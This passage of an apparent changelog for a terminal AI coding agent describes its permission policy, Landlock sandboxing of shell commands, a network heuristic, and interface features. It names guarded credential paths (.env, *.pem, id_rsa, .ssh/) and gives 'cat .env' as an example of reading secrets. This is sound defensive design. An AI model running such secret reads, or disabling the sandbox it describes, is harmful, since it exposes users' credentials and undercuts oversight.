  `network: deny` would be answers given on somebody's behalf before they had been asked.
- Permissions are finer than a capability: `Careful` holds path rules as well as stances - `.env*`,
  `*.pem`, `id_rsa*`, `.ssh/` and a few more, all `ask` - and the strictest of everything consulted
  wins. They bind `read`, `write` and `edit` and deliberately not `shell`, since a check over a
  command string would refuse `cat .env` while waving `sed -n 1p .env` through.
- The permission question names everything the policy consults, and `[a] always` answers for all of
  it including calls already waiting. Arguments are shown as the lines they are; `[i]` shows the
  JSON verbatim. A question arriving while somebody is typing does not take the typing as an answer.
  `d` drops every waiting call with one reason, and the model is told.
- A call the policy refuses on its own says which stance refused it.
- Four tools (`read`, `write`, `edit`, `shell`) and a policy that asks about all of it. "Always"
  answers for a capability rather than a tool name. The `network` stance is consulted for a `shell`
  command naming a program that goes out to the network, because no tool declares
  `Capability::Network` and a model that wants the network writes `curl`. The heuristic is over the
  command as written rather than a sandbox, and says so.
- **The `shell` tool runs under [Landlock](https://landlock.io)**, so the stances are enforced
  rather than reported: `network: deny` is refused by the kernel at `connect()` and `write: deny`
  makes the working directory read-only. Applied by re-executing this program in a mode that
  confines itself and then *becomes* the command - Landlock restricts the calling thread, and the
  `exec` means the domain is inherited and a stopped call kills the command rather than a helper. A
  directory of the run's own is handed over as `TMPDIR`; `/tmp` itself is not opened up.
- `read`, `write` and `edit` are held to the same boundary by their own code, resolving `..` and
  symlinks before comparing. Weaker in kind than a ruleset, and said to be.
- `--sandbox-allow PATH` opens another path, `--no-sandbox` turns the whole thing off, and the
  permissions tab says which of `shell: confined` and `shell: a command can do any of these` is
  true. If it cannot confine, the shell runs unconfined and the tab says so.
- The model's answers render as markdown, via `tui-markdown` with this crate's own styling - the
  defaults put a coloured slab behind headings and code. Nothing else is treated as markdown: a
  tool's output is what the tool said.
- Fenced code blocks are syntax-coloured by token *name* via `synoptic`, split out before the
  markdown renderer sees them, so a block still streaming in is a block.
- The secondary things are `Gray` rather than `DarkGray`, which is the terminal's bright *black* and
  sits a shade off the background on many themes.
- `/step` performs exactly one transition instead of a whole turn, which is the only way to stand in
  `State::Ready`.
- `/seams` says what is plugged into each of the runtime's six parts, asked of the kernel.
- `/tools drop ID` stops offering a tool from the next request onward.
- `ctrl+p` heads the request with what the projector left out and what it repaired.
- `/budget`, and a `~` on the status line's estimate beside what the provider really charged.
- Cooperative stopping on `esc`: the provider returns what it streamed, the shell tool kills the
  command and everything it started, since it runs in a process group of its own, and still answers
  the call. Both wait on a heartbeat rather than the next byte.
- A compactor that elides the oldest tool results past `--compact` of the limit, refused anything
  pinned. It elides rather than removes, so each call keeps its answer. Nothing is deleted.
- MCP servers with `--mcp '[name=]cmd args'`, behind the default `mcp` feature. The name prefixes
  the server's tools and is what an "always" grant is for.
- `/model [ID]` and `/provider [URL [ID]]` show or change the model and address without restarting.
  Both are shown, because the same model name at a different address is a different model. The key
  is not changed with the address: a key typed at the prompt would be a key in the transcript.
- `/models [FILTER]` asks the endpoint what it serves and marks the one in use with `▸`. The ids
  belong to the address, so `/model` was a command you could only use if you already knew what to
  type.
- The status line carries the host beside the model name; where it does not fit, the address gives
  way rather than the figures.
- **The TLS is `rustls` over `ring`**, so building needs nothing installed first. In reqwest 0.13
  `default-tls` means rustls with `aws-lc-rs`: 1,659 C files and, on some platforms, cmake and NASM.
  `ring` is 17 C and assembly files and no system libraries.
- `--help` lists the environment as well as the flags. `KAMCHATKA_BASE_URL` and
  `KAMCHATKA_CONTEXT_LIMIT` are read directly and so appeared nowhere the program would tell you
  about.
- `/save PATH` writes the event log and a resumable snapshot beside it; `-r PATH` picks it back up
  in a fresh process. Both take a path you chose - there is no session id and no server.
- Tested by drawing the screen into a `TestBackend` and reading the characters back, against a
  scripted model.
